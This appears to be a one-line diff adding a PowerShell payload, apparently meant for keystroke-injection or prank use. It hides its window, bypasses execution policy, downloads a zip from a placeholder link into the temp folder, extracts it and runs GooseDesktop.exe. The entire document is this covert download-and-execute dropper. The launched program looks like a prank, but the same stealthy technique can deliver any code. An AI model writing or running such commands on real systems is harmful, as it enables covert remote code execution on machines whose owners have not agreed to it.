@@ -1,0 +1,1 @@
+powershell -w -h -NoP -NonI -Ep Bypass $G="$env:tmp"; iwr -Uri 'link to zip' -O "$G\goose.zip";Expand-Archive "$G\goose.zip" -Des $G -Force;. $G\Goose\GooseDesktop.exe
